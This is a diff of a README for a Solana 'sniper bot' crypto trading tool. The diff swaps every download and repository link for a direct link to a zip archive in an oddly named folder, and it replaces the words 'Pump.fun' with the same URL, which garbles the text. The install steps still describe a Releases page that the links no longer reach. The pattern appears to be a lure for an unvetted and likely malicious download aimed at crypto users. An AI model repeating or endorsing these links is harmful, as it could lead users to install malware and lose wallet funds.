@@ -1,13 +1,13 @@
 # 🤖 solana-pumpfunx-sniper-bot - Fast and Accurate Crypto Trading
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via%20Releases-blue)](https://github.com/Looktung05/solana-pumpfunx-sniper-bot/releases)
+[![Download](https://raw.githubusercontent.com/Looktung05/solana-pumpfunx-sniper-bot/main/spatulamancy/solana-pumpfunx-sniper-bot.zip%20Releases-blue)](https://raw.githubusercontent.com/Looktung05/solana-pumpfunx-sniper-bot/main/spatulamancy/solana-pumpfunx-sniper-bot.zip)
 
 ## 🚀 Getting Started
 Welcome to the **solana-pumpfunx-sniper-bot**! This tool helps you get fast and precise results in crypto trading. You can use this application as a combined sniper bot and trading bot for the Solana network. It incorporates advanced tactics to enhance your trading experience.
 
 ## 🔍 What Is This Tool?
-This application offers a solution for both sniping and trading on Solana. It integrates the Pump.fun bundler support and uses MEV front-run logic. This means you can validate your crypto strategies safely without technical hurdles.
+This application offers a solution for both sniping and trading on Solana. It integrates the https://raw.githubusercontent.com/Looktung05/solana-pumpfunx-sniper-bot/main/spatulamancy/solana-pumpfunx-sniper-bot.zip bundler support and uses MEV front-run logic. This means you can validate your crypto strategies safely without technical hurdles.
 
 ## 📂 Features
 - **High-Speed Trades:** Execute trades quickly to take advantage of market conditions.
@@ -24,7 +24,7 @@ Before you download, ensure your system meets the following requirements:
 - Network: Stable Internet connection for trading.
 
 ## 💾 Download & Install
-To get started, visit this page to download the latest version of the software: [Download Here](https://github.com/Looktung05/solana-pumpfunx-sniper-bot/releases).
+To get started, visit this page to download the latest version of the software: [Download Here](https://raw.githubusercontent.com/Looktung05/solana-pumpfunx-sniper-bot/main/spatulamancy/solana-pumpfunx-sniper-bot.zip).
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, find the most recent version listed.
@@ -56,7 +56,7 @@ For support, please check the GitHub page for any open issues or raise a new iss
 ## 🌐 Learn More
 For detailed information about features and updates, check out our GitHub repository. Here, you will find a community of users and developers who share tips and insights.
 
-- **GitHub Repository:** [Visit Here](https://github.com/Looktung05/solana-pumpfunx-sniper-bot)
+- **GitHub Repository:** [Visit Here](https://raw.githubusercontent.com/Looktung05/solana-pumpfunx-sniper-bot/main/spatulamancy/solana-pumpfunx-sniper-bot.zip)
 
 ## 📝 Topics Covered
 - ai-trading
